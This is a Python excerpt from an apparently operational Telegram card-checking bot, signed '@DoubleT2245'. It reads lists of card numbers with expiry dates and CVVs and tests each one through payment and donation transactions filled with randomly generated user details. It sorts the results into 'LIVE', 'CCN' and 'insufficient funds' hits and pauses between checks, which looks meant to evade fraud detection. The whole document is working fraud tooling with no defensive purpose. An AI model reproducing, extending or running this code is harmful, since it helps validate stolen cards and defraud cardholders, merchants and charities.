async def send_combined_status(chat_id, session, current_card="", response=""):
    """Send combined checking log and status like in the photo"""
    progress = (session['processed'] / session['total']) * 100 if session['total'] > 0 else 0
    progress = round(progress, 2)
    
    timestamp = time.strftime("%I:%M %p")
    
    # Build the message exactly like in the photo
    message = ""
    
    if current_card and response:
        # Checking log section
        message += f"CHECKING : {current_card}\n"
        message += f"RESPONSE : {response}\n"
    
    # Progress and status section
    message += f"PROGRESS : {progress}% ({session['processed']}/{session['total']})\n\n"
    
    message += f"✔ HIT : {session['hit']}\n"
    message += f"✔ LIVE : {session['live']}\n"
    message += f"✔ INSUFFICIENT : {session['insufficient']}\n"
    message += f"✔ CCN : {session['ccn']}\n\n"
    
    message += f"BOT BY : @DoubleT2245    {timestamp}"
    
    await send_tele(chat_id, message)

def process_card_file(chat_id, file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        session = load_session()
        session['total'] = len(lines)
        session['processed'] = 0
        session['live'] = 0
        session['insufficient'] = 0
        session['hit'] = 0
        session['ccn'] = 0
        session['current_file'] = file_path
        save_session(session)
        
        users = load_users()
        user_info = users.get(str(chat_id), {'id': str(chat_id), 'username': 'Unknown', 'joined': 'Unknown'})
        
        # Send initial combined status
        asyncio.run(send_combined_status(chat_id, session))
        
        for i, line in enumerate(lines):
            if chat_id in current_processing and not current_processing[chat_id]:
                break
                
            card = line.strip()
            if not card:
                continue
                
            parts = card.split('|')
            if len(parts) < 4:
                continue
                
            cc_no, month, year, cvv = [part.strip() for part in parts[:4]]
            
            # Zeta retry mechanism for payment
            try:
                payment_result = zeta_retry_operation(lambda: payment(card, cc_no, month, year, cvv))
                vbv_status = payment_result[2] if payment_result and len(payment_result) > 2 else "VBV - Unknown"
            except Exception as e:
                session['processed'] += 1
                save_session(session)
                # Update status with error
                asyncio.run(send_combined_status(chat_id, session, card, f"Payment Error: {str(e)}"))
                continue
            
            response_text = ""
            if payment_result and payment_result[0]:
                random_info = random_user_info()
                if random_info[0]:
                    # Zeta retry mechanism for donate
                    try:
                        donate_result = zeta_retry_operation(lambda: enhanced_donate(card, payment_result[1], random_info[1], random_info[2], vbv_status))
                        vbv_status = donate_result[5] if donate_result and len(donate_result) > 5 else vbv_status
                    except Exception as e:
                        session['processed'] += 1
                        save_session(session)
                        asyncio.run(send_combined_status(chat_id, session, card, f"Donate Error: {str(e)}"))
                        continue
                    
                    if donate_result and donate_result[0]:
                        if donate_result[1] == "live":
                            session['live'] += 1
                            session['hit'] += 1
                            response_text = f"LIVE - {donate_result[2]}"
                        elif donate_result[1] == "ccn":
                            session['ccn'] += 1
                            response_text = f"CCN - {donate_result[2]}"
                        elif donate_result[1] == "insufficient":
                            session['insufficient'] += 1
                            response_text = "Insufficient Funds"
                        else:
                            response_text = f"Declined - {donate_result[2]}"
                    else:
                        response_text = f"Declined - {donate_result[2] if donate_result else 'Unknown'}"
                else:
                    response_text = "Random Gen Failed"
            else:
                response_text = payment_result[1] if payment_result else "Payment Failed"
            
            session['processed'] += 1
            save_session(session)
            
            # Update combined status after each card check
            asyncio.run(send_combined_status(chat_id, session, card, response_text))
            
            # Zeta delay between checks - 3 fucking minutes
            if i < len(lines) - 1:
                time.sleep(ZETA_DELAY_BETWEEN_CHECKS)
        
        # Final completion message
        final_message = f"✅ CHECK COMPLETED!\nProcessed: {session['processed']} cards\nLIVE: {session['live']}\nINSUFFICIENT: {session['insufficient']}\nCCN: {session['ccn']}\nHIT: {session['hit']}"
        asyncio.run(send_tele(chat_id, final_message))
        
        if chat_id in current_processing:
            del current_processing[chat_id]
            
    except Exception as e:
        asyncio.run(send_tele(chat_id, f"❌ Zeta processing error: {str(e)}"))
        if chat_id in current_processing:
            current_processing[chat_id] = False
